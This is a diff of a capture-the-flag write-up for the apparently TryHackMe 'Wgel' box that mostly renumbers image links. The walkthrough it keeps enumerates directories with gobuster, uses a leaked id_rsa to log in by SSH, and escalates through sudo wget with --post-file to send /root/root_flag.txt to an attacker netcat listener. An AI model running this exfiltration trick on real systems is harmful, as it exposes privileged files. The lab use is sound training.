@@ -2,7 +2,7 @@
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (134).png" alt="" width="188"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (148).png" alt="" width="188"><figcaption></figcaption></figure>
 
 </div>
 
@@ -96,11 +96,11 @@ We see that we've two open ports: 22 and 80.
 
 Then we can start to see website (port 80):
 
-<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>
 
 and see page source for checking information disclosure.
 
-<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
 
 Very good! Thanks to this message, we know that Jessie is a user/web master.
 
@@ -110,11 +110,11 @@ Another good thing to do, is find hidden paths on website using gobuster
 gobuster dir -u wgel.thm -w /usr/share/wordlists/dirb/common.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>
 
 We can explore /sitemap path:
 
-<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>
 
 We can try to do a new gobuster search start at this point:
 
@@ -122,17 +122,17 @@ We can try to do a new gobuster search start at this point:
 gobuster dir -u wgel.thm/sitemap -w /usr/share/wordlists/dirb/common.txt  
 ```
 
-<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
 we've find and id\_rsa:
 
-<figure><img src="../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
 
 remembering that we've user and id rsa, first take permission to id\_rsa file and try login:
 
@@ -154,7 +154,7 @@ We're in, try to find user.txt flag using find command:\
 find / -type f -iname "*flag.txt" 2>/dev/null
 ```
 
-<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -168,15 +168,15 @@ find / -type f -iname "*flag.txt" 2>/dev/null
 
 We can do sudo -l command to discover user's permissions.
 
-<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
 
 We can run /usr/bin/wget as root. Perfect, time to go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) and find our exploit.&#x20;
 
-<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a></p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a></p></figcaption></figure>
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -184,21 +184,21 @@ unfortunately, it doesn't work!
 
 Checking on google, we find this good article that suggests to use post-file option of wget  command, to send the content of any file.
 
-<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption><p><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</a></p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</a></p></figcaption></figure>
 
 More probably root flag there're in root path and its name will be similar than user\_flag.txt, then, we can try to setting post-file option: —post-file=/root/root\_flag.txt, add our IP and open a listen session with netcat to receive file.
 
-<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
 
 ```bash
 sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
 ```
 
-<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
